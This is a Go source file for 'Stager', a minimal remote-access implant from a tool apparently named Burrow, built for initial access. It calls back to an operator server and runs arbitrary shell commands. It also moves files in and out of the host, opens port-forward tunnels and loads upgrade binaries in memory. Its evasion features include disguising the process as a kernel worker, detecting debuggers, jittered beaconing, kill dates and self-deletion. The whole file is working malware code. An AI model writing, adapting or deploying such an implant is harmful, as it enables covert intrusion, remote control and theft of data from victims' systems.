// Stager — Minimal Burrow agent for initial access.
//
// Connects back to a server over TCP or WebSocket (±TLS), runs commands,
// transfers files, and establishes local port-forward tunnels. No TUI,
// no TUN, no SOCKS5, no netstack, no cobra, no charmbracelet.
//
// Build:
//
//	CGO_ENABLED=0 go build -ldflags="-s -w" -o stager ./cmd/stager/
//
// With embedded config:
//
// With embedded config:
//
//	go build -ldflags="-s -w \
//	  -X main.defaultServer=10.0.0.1:11601 \
//	  -X main.defaultNoTLS=false \
//	  -X main.defaultFingerprint=AB:CD:EF:... \
//	  -X main.defaultMasq=true" \
//	  -o stager ./cmd/stager/
package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"flag"
	"fmt"
	"math"
	"math/rand/v2"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/loudmumble/burrow/internal/certgen"
	"github.com/loudmumble/burrow/internal/mux"
	"github.com/loudmumble/burrow/internal/protocol"
	"github.com/loudmumble/burrow/internal/relay"
	"github.com/loudmumble/burrow/internal/sys"
	"github.com/loudmumble/burrow/internal/transport/ws"
)


// Embedded config — set at build time via -ldflags -X:
//
//	go build -ldflags="-X main.defaultServer=10.0.0.1:11601 -X main.defaultNoTLS=true"
var (
	defaultServer      string // e.g. "10.0.0.1:11601" or "s1:11601,s2:11601"
	defaultNoTLS       string // "true" or "false"
	defaultMasq        string // "true" to enable process masquerade
	defaultFingerprint string // SHA-256 cert fingerprint for pinning (colon-separated uppercase hex)
	defaultTransport   string // "raw" or "ws" — transport protocol
	version            = "4.0.0-stager"
)

func main() {
	// Defaults from embedded config, overridable by CLI flags.
	serverFlag := defaultServer
	noTLS := defaultNoTLS == "true"
	masq := defaultMasq == "true"

	var fingerprint string
	var selfDelete bool
	var maxRetries int
	var beacon time.Duration
	transportFlag := defaultTransport
	if transportFlag == "" {
		transportFlag = "raw"
	}

	flag.StringVar(&serverFlag, "c", serverFlag, "Server address(es), comma-separated")
	flag.StringVar(&fingerprint, "fp", defaultFingerprint, "Expected server TLS fingerprint (SHA-256, colon-separated hex)")
	flag.StringVar(&transportFlag, "t", transportFlag, "Transport protocol (raw, ws) - comma separated list supported")
	flag.BoolVar(&noTLS, "no-tls", noTLS, "Disable TLS")
	flag.BoolVar(&selfDelete, "self-delete", false, "Delete binary after exit")
	flag.BoolVar(&masq, "masquerade", masq, "Masquerade process name (Linux)")
	flag.IntVar(&maxRetries, "max-retries", 0, "Max reconnection attempts (0=infinite)")
	flag.DurationVar(&beacon, "beacon", 0, "Sleep duration between disconnect and reconnect (e.g. 30s)")
	
	var killDateStr string
	var scheduleStr string
	flag.StringVar(&killDateStr, "kill-date", "", "Self-destruct after this date/time (RFC3339, e.g. 2026-04-15T18:00:00Z)")
	flag.StringVar(&scheduleStr, "schedule", "", "Only connect during these hours (e.g. 08:00-18:00)")
	flag.Parse()

	transports := strings.Split(transportFlag, ",")
	for i := range transports {
		transports[i] = strings.TrimSpace(transports[i])
	}
	if len(transports) == 0 || transports[0] == "" {
		transports = []string{"raw"}
	}

	if serverFlag == "" {
		fmt.Fprintln(os.Stderr, "error: -c <server> required")
		os.Exit(1)
	}

	// Process masquerade (Linux only, must run early).
	if masq && runtime.GOOS == "linux" {
		masqueradeProcess("[kworker/0:1]")
	}

	servers := parseServers(serverFlag)

	// Signal handler.
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() {
		sig := make(chan os.Signal, 1)
		signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
		<-sig
		cancel()
	}()

	var killDate time.Time
	if killDateStr != "" {
		var err error
		killDate, err = time.Parse(time.RFC3339, killDateStr)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] Invalid kill-date: %v\n", err)
			os.Exit(1)
		}
		if time.Now().After(killDate) {
			return
		}
	}

	var schedStart, schedEnd int
	hasSchedule := false
	if scheduleStr != "" {
		parts := strings.SplitN(scheduleStr, "-", 2)
		if len(parts) == 2 {
			schedStart = parseTimeOfDay(parts[0])
			schedEnd = parseTimeOfDay(parts[1])
			if schedStart >= 0 && schedEnd >= 0 {
				hasSchedule = true
			}
		}
	}

	if !killDate.IsZero() {
		go func() {
			for {
				if time.Now().After(killDate) {
					cancel()
					return
				}
				select {
				case <-time.After(time.Minute):
				case <-ctx.Done():
					return
				}
			}
		}()
	}

	// --- Reconnect loop with multi-server fallback ---
	serverIdx := 0
	retryCount := 0

	for ctx.Err() == nil {
		if !killDate.IsZero() && time.Now().After(killDate) {
			break
		}

		if hasSchedule {
			if !inSchedule(schedStart, schedEnd) {
				sleepUntilSchedule(ctx, schedStart)
				if ctx.Err() != nil {
					break
				}
				continue
			}
		}

		addr := servers[serverIdx]
		activeTransport := transports[retryCount%len(transports)]
		conn, err := dialServer(ctx, addr, noTLS, fingerprint, activeTransport)
		if err != nil {
			if ctx.Err() != nil {
				break
			}
			retryCount++
			if maxRetries > 0 && retryCount > maxRetries {
				break
			}
			serverIdx = (serverIdx + 1) % len(servers)
			delay := backoffJitter(retryCount)
			select {
			case <-time.After(delay):
			case <-ctx.Done():
			}
			continue
		}

		retryCount = 0

		sessionErr := runSession(ctx, conn)

		if ctx.Err() != nil {
			break
		}

		// Handle server-initiated sleep.
		if se, ok := sessionErr.(*sleepErr); ok {
			dur := time.Duration(se.seconds) * time.Second
			jit := float64(dur) * 0.1 * (rand.Float64()*2 - 1)
			select {
			case <-time.After(dur + time.Duration(jit)):
			case <-ctx.Done():
			}
			continue
		}

		if sessionErr != nil && ctx.Err() == nil {
			fmt.Fprintf(os.Stderr, "[!] session: %v\n", sessionErr)
		}

		// Beacon sleep (±20% jitter) before reconnect.
		if beacon > 0 {
			jit := float64(beacon) * 0.2 * (rand.Float64()*2 - 1)
			select {
			case <-time.After(beacon + time.Duration(jit)):
			case <-ctx.Done():
			}
		}

		if maxRetries > 0 {
			retryCount++
			if retryCount > maxRetries {
				break
			}
		}
	}

	if selfDelete {
		doSelfDelete()
	}
}

// -------------------------------------------------------------------
// Connection
// -------------------------------------------------------------------

func dialServer(ctx context.Context, addr string, noTLS bool, fingerprint string, transportName string) (net.Conn, error) {
	var tlsCfg *tls.Config
	if !noTLS {
		tlsCfg = &tls.Config{
			MinVersion:         tls.VersionTLS12,
			InsecureSkipVerify: true,
		}
		if fingerprint != "" {
			expected := strings.ToUpper(strings.TrimSpace(fingerprint))
			tlsCfg.VerifyPeerCertificate = func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
				if len(rawCerts) == 0 {
					return errors.New("no peer certificates presented")
				}
				peerCert, err := x509.ParseCertificate(rawCerts[0])
				if err != nil {
					return fmt.Errorf("parse peer certificate: %w", err)
				}
				actual := certgen.Fingerprint(peerCert)
				if !strings.HasPrefix(actual, expected) {
					return fmt.Errorf("%w: expected %s, got %s",
						certgen.ErrFingerprintMismatch, expected, actual)
				}
				return nil
			}
		}
	}

	switch transportName {
	case "ws":
		// Auto-prefix ws:// or wss:// if not present.
		if !strings.HasPrefix(addr, "ws://") && !strings.HasPrefix(addr, "wss://") {
			if noTLS {
				addr = "ws://" + addr
			} else {
				addr = "wss://" + addr
			}
		}
		t := ws.NewWSTransport()
		conn, err := t.Dial(ctx, addr, tlsCfg)
		if err != nil {
			return nil, err
		}
		return conn, nil
	default: // "raw" TCP
		d := &net.Dialer{Timeout: 10 * time.Second}
		var conn net.Conn
		var err error
		network := "tcp"
		if !strings.Contains(addr, "[") {
			network = "tcp4"
		}
		if noTLS {
			conn, err = d.DialContext(ctx, network, addr)
		} else {
			conn, err = tls.DialWithDialer(d, network, addr, tlsCfg)
		}
		if err != nil {
			return nil, err
		}
		tuneConn(conn)
		return conn, nil
	}
}

// -------------------------------------------------------------------
// Session
// -------------------------------------------------------------------

func runSession(ctx context.Context, conn net.Conn) error {
	defer conn.Close()

	sess, err := mux.NewClientSession(conn)
	if err != nil {
		return fmt.Errorf("mux: %w", err)
	}
	defer sess.Close()

	ctrl, err := sess.Open()
	if err != nil {
		return fmt.Errorf("ctrl stream: %w", err)
	}
	defer ctrl.Close()

	// Handshake.
	hostname, _ := os.Hostname()
	handshake := &protocol.HandshakePayload{
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		IPs:       localIPs(),
		PID:       os.Getpid(),
		Version:   version,
		NumCPU:    runtime.NumCPU(),
		GoVersion: runtime.Version(),
		Debugged:  isDebuggerAttached(),
	}
	msg, err := protocol.EncodeHandshake(handshake)
	if err != nil {
		return err
	}
	if err := protocol.WriteMessage(ctrl, msg); err != nil {
		return err
	}

	ackMsg, err := protocol.ReadMessage(ctrl)
	if err != nil {
		return err
	}
	if _, err := protocol.DecodeHandshakeAck(ackMsg); err != nil {
		return err
	}

	return cmdLoop(ctx, ctrl)
}

// -------------------------------------------------------------------
// Command loop
// -------------------------------------------------------------------

func cmdLoop(ctx context.Context, ctrl net.Conn) error {
	tunnels := make(map[string]*localTunnel)
	var mu sync.Mutex // ctrl write mutex — protects all writes to ctrl

	defer func() {
		for _, t := range tunnels {
			t.stop()
		}
	}()

	msgCh := make(chan *protocol.Message, 32)
	errCh := make(chan error, 1)

	go func() {
		for {
			m, err := protocol.ReadMessage(ctrl)
			if err != nil {
				select {
				case errCh <- err:
				default:
				}
				return
			}
			select {
			case msgCh <- m:
			case <-ctx.Done():
				return
			}
		}
	}()

	for {
		select {
		case <-ctx.Done():
			return nil

		case err := <-errCh:
			return fmt.Errorf("ctrl read: %w", err)

		case msg := <-msgCh:
			switch msg.Type {
			case protocol.MsgPing:
				mu.Lock()
				err := protocol.WriteMessage(ctrl, protocol.NewPong())
				mu.Unlock()
				if err != nil {
					return err
				}

			case protocol.MsgTunnelRequest:
				req, err := protocol.DecodeTunnelRequest(msg)
				if err != nil {
					continue
				}
				ack := &protocol.TunnelAckPayload{ID: req.ID}
				if req.Direction != "local" {
					ack.Error = "stager: only local tunnels supported"
				} else {
					t, tErr := startLocalTunnel(ctx, req.ListenAddr, req.RemoteAddr)
					if tErr != nil {
						ack.Error = tErr.Error()
					} else {
						ack.BoundAddr = t.boundAddr()
						tunnels[req.ID] = t
					}
				}
				m, _ := protocol.EncodeTunnelAck(ack)
				mu.Lock()
				protocol.WriteMessage(ctrl, m)
				mu.Unlock()

			case protocol.MsgTunnelClose:
				id, err := protocol.DecodeTunnelClose(msg)
				if err != nil {
					continue
				}
				if t, ok := tunnels[id]; ok {
					t.stop()
					delete(tunnels, id)
				}

			case protocol.MsgExecRequest:
				req, err := protocol.DecodeExecRequest(msg)
				if err != nil {
					continue
				}
				go execCmd(req.ID, req.Command, ctrl, &mu)

			case protocol.MsgFileDownloadRequest:
				req, err := protocol.DecodeFileDownloadRequest(msg)
				if err != nil {
					continue
				}
				go fileDownload(req.ID, req.FilePath, ctrl, &mu)

			case protocol.MsgFileUploadRequest:
				req, err := protocol.DecodeFileUploadRequest(msg)
				if err != nil {
					continue
				}
				go fileUpload(req.ID, req.FilePath, req.Data, ctrl, &mu)

			case protocol.MsgUpgrade:
				up, err := protocol.DecodeUpgrade(msg)
				if err != nil {
					ack, _ := protocol.EncodeUpgradeAck("decode: " + err.Error())
					mu.Lock()
					protocol.WriteMessage(ctrl, ack)
					mu.Unlock()
					continue
				}
				// Send ack before exec (exec replaces the process).
				ack, _ := protocol.EncodeUpgradeAck("")
				mu.Lock()
				protocol.WriteMessage(ctrl, ack)
				mu.Unlock()
				// Close session cleanly before exec.
				ctrl.Close()
				if execErr := sys.MemExec(up.Binary, up.Args); execErr != nil {
					// memExec failed — return error so stager reconnects.
					return fmt.Errorf("upgrade exec: %w", execErr)
				}
				return nil // unreachable if execve succeeds

			case protocol.MsgSleep:
				sp, err := protocol.DecodeSleep(msg)
				if err != nil {
					continue
				}
				return &sleepErr{seconds: sp.Seconds}

			case protocol.MsgError:
				s, _ := protocol.DecodeError(msg)
				return fmt.Errorf("server: %s", s)

			default:
				// Silently ignore unsupported message types
				// (routes, listeners, TUN, etc.)
			}
		}
	}
}

// -------------------------------------------------------------------
// Exec
// -------------------------------------------------------------------

func execCmd(id, command string, ctrl net.Conn, mu *sync.Mutex) {
	resp := &protocol.ExecResponsePayload{ID: id}
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", command)
	} else {
		c = exec.Command("sh", "-c", command)
	}
	// 60-second timeout matches the full agent.
	done := make(chan error, 1)
	var out []byte
	go func() {
		var err error
		out, err = c.CombinedOutput()
		done <- err
	}()
	var execErr error
	select {
	case execErr = <-done:
	case <-time.After(60 * time.Second):
		if c.Process != nil {
			c.Process.Kill()
		}
		execErr = fmt.Errorf("exec timeout after 60s")
	}
	resp.Output = strings.TrimRight(string(out), "\r\n")
	if execErr != nil {
		resp.Error = execErr.Error()
	}
	if m, _ := protocol.EncodeExecResponse(resp); m != nil {
		mu.Lock()
		protocol.WriteMessage(ctrl, m)
		mu.Unlock()
	}
}

// -------------------------------------------------------------------
// File transfer
// -------------------------------------------------------------------

func fileDownload(id, path string, ctrl net.Conn, mu *sync.Mutex) {
	resp := &protocol.FileDownloadResponsePayload{ID: id}
	data, err := os.ReadFile(path)
	if err != nil {
		resp.Error = err.Error()
	} else {
		resp.FileName = filepath.Base(path)
		resp.Data = data
		resp.Size = int64(len(data))
	}
	if m, _ := protocol.EncodeFileDownloadResponse(resp); m != nil {
		mu.Lock()
		protocol.WriteMessage(ctrl, m)
		mu.Unlock()
	}
}

func fileUpload(id, path string, data []byte, ctrl net.Conn, mu *sync.Mutex) {
	resp := &protocol.FileUploadResponsePayload{ID: id}
	if err := os.WriteFile(path, data, 0644); err != nil {
		resp.Error = err.Error()
	} else {
		resp.Size = int64(len(data))
	}
	if m, _ := protocol.EncodeFileUploadResponse(resp); m != nil {
		mu.Lock()
		protocol.WriteMessage(ctrl, m)
		mu.Unlock()
	}
}

// -------------------------------------------------------------------
// Local tunnel (listen locally → dial remote → relay)
// -------------------------------------------------------------------

type localTunnel struct {
	ln     net.Listener
	cancel context.CancelFunc
	wg     sync.WaitGroup
}

func startLocalTunnel(parent context.Context, listen, remote string) (*localTunnel, error) {
	network := "tcp"
	if !strings.Contains(listen, "[") {
		network = "tcp4"
	}
	ln, err := net.Listen(network, listen)
	if err != nil {
		return nil, err
	}

	ctx, cancel := context.WithCancel(parent)
	t := &localTunnel{ln: ln, cancel: cancel}

	go func() { <-ctx.Done(); ln.Close() }()

	t.wg.Add(1)
	go func() {
		defer t.wg.Done()
		for {
			c, err := ln.Accept()
			if err != nil {
				if ctx.Err() != nil || errors.Is(err, net.ErrClosed) {
					return
				}
				continue
			}
			t.wg.Add(1)
			go func(c net.Conn) {
				defer t.wg.Done()
				defer c.Close()
				relay.TuneConn(c)

				network := "tcp"
				if !strings.Contains(remote, "[") {
					network = "tcp4"
				}
				r, err := net.DialTimeout(network, remote, 10*time.Second)
				if err != nil {
					return
				}
				defer r.Close()
				relay.TuneConn(r)

				// Bidirectional relay with pooled buffers.
				done := make(chan struct{}, 2)
				go func() {
					relay.CopyBuffered(r, c)
					if tc, ok := r.(*net.TCPConn); ok {
						tc.CloseWrite()
					}
					done <- struct{}{}
				}()
				go func() {
					relay.CopyBuffered(c, r)
					if tc, ok := c.(*net.TCPConn); ok {
						tc.CloseWrite()
					}
					done <- struct{}{}
				}()
				<-done
				c.Close()
				r.Close()
				<-done
			}(c)
		}
	}()

	return t, nil
}

func (t *localTunnel) boundAddr() string {
	if t.ln != nil {
		return t.ln.Addr().String()
	}
	return ""
}

func (t *localTunnel) stop() {
	t.cancel()
	t.wg.Wait()
}

// -------------------------------------------------------------------
// Backoff with jitter: base*2^attempt + rand(0,30%) capped at 60s
// -------------------------------------------------------------------

// sleepErr is returned by cmdLoop when the server sends MsgSleep.
type sleepErr struct{ seconds int64 }

func (e *sleepErr) Error() string {
	return fmt.Sprintf("sleep: %ds", e.seconds)
}

func parseTimeOfDay(s string) int {
	s = strings.TrimSpace(s)
	parts := strings.SplitN(s, ":", 2)
	if len(parts) != 2 {
		return -1
	}
	h, err1 := fmt.Sscanf(parts[0], "%d", new(int))
	m, err2 := fmt.Sscanf(parts[1], "%d", new(int))
	if h != 1 || m != 1 || err1 != nil || err2 != nil {
		return -1
	}
	var hour, min int
	fmt.Sscanf(parts[0], "%d", &hour)
	fmt.Sscanf(parts[1], "%d", &min)
	if hour < 0 || hour > 23 || min < 0 || min > 59 {
		return -1
	}
	return hour*60 + min
}

func inSchedule(startMin, endMin int) bool {
	now := time.Now()
	nowMin := now.Hour()*60 + now.Minute()
	if startMin <= endMin {
		return nowMin >= startMin && nowMin < endMin
	}
	return nowMin >= startMin || nowMin < endMin
}

func sleepUntilSchedule(ctx context.Context, startMin int) {
	now := time.Now()
	nowMin := now.Hour()*60 + now.Minute()
	var waitMin int
	if nowMin < startMin {
		waitMin = startMin - nowMin
	} else {
		waitMin = (24*60 - nowMin) + startMin
	}
	jitter := time.Duration(1+rand.IntN(5)) * time.Minute
	select {
	case <-time.After(time.Duration(waitMin)*time.Minute + jitter):
	case <-ctx.Done():
	}
}

func backoffJitter(attempt int) time.Duration {
	d := float64(time.Second) * math.Pow(2, float64(attempt))
	cap := float64(60 * time.Second)
	if d > cap {
		d = cap
	}
	// Add 0–30% of delay as jitter.
	return time.Duration(d + d*0.3*rand.Float64())
}

// -------------------------------------------------------------------
// Self-delete
// -------------------------------------------------------------------

func doSelfDelete() {
	exe, err := os.Executable()
	if err != nil {
		exe = os.Args[0]
	}
	exe, _ = filepath.Abs(exe)

	if runtime.GOOS == "windows" {
		// Windows can't delete a running binary; spawn a deferred del.
		exec.Command("cmd", "/C", "timeout /T 2 /NOBREAK >nul & del \""+exe+"\"").Start()
	} else {
		os.Remove(exe)
	}
}

// -------------------------------------------------------------------
// Process masquerade (Linux only)
// -------------------------------------------------------------------

func masqueradeProcess(name string) {
	// /proc/self/comm controls what ps/top display (max 15 chars).
	comm := name
	if len(comm) > 15 {
		comm = comm[:15]
	}
	_ = os.WriteFile("/proc/self/comm", []byte(comm), 0)
}

func isDebuggerAttached() bool {
	if runtime.GOOS != "linux" {
		return false
	}
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "TracerPid:") {
			pid := strings.TrimSpace(strings.TrimPrefix(line, "TracerPid:"))
			return pid != "0"
		}
	}
	return false
}

// -------------------------------------------------------------------
// Helpers
// -------------------------------------------------------------------

func parseServers(s string) []string {
	parts := strings.Split(s, ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}

// tuneConn applies TCP_NODELAY, 4 MiB socket buffers, and keepalive.
// Handles both plain TCP and TLS connections.
func tuneConn(c net.Conn) {
	var tc *net.TCPConn
	switch v := c.(type) {
	case *net.TCPConn:
		tc = v
	case *tls.Conn:
		if raw, ok := v.NetConn().(*net.TCPConn); ok {
			tc = raw
		}
	}
	if tc == nil {
		return
	}
	_ = tc.SetNoDelay(true)
	_ = tc.SetReadBuffer(4 << 20)
	_ = tc.SetWriteBuffer(4 << 20)
	_ = tc.SetKeepAlive(true)
	_ = tc.SetKeepAlivePeriod(30 * time.Second)
}

func localIPs() []string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return nil
	}
	var ips []string
	for _, a := range addrs {
		if ipn, ok := a.(*net.IPNet); ok && !ipn.IP.IsLoopback() {
			if ip := ipn.IP.To4(); ip != nil {
				ips = append(ips, ip.String())
			}
		}
	}
	return ips
}
